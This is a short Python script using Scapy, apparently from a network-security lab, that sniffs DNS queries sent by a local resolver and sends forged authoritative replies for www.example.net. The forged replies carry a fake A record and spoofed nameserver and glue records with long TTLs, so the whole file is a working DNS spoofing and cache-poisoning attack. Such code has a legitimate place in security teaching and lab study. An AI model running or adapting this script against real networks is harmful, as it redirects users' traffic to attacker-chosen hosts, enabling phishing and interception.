#!/usr/bin/python3
from scapy.all import *

local_dns_srv = "172.17.0.2"

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):
        old_ip = pkt[IP]
        old_udp = pkt[UDP]
        old_dns = pkt[DNS]

        ip = IP ( dst = old_ip.src,
                  src = old_ip.dst )

        udp = UDP ( dport = old_udp.sport,
                    sport = 53 )

        Anssec = DNSRR( rrname = old_dns.qd.qname,
                        type = 'A',
                        rdata = '11.22.33.44',
                        ttl = 259200)

        NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns1.example.net')
        NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='ns2.example.net')

        Addsec1 = DNSRR(rrname='ns1.example.net', type='A', ttl=259200, rdata='123.123.123.123')
        Addsec2 = DNSRR(rrname='ns2.example.net', type='A', ttl=259200, rdata='112.112.112.112')
        
        dns = DNS( id = old_dns.id,
                   aa=1,qr=1,qdcount=1,ancount=1,
                   nscount=2,arcount=2,
                   qd = old_dns.qd,
                   an = Anssec,
                   ns=NSsec1/NSsec2,ar=Addsec1/Addsec2)
        spoofpkt = ip/udp/dns
        send(spoofpkt)

f = 'udp and (src host {} and dst port 53)'.format(local_dns_srv)
pkt=sniff(filter=f, prn=spoof_dns)

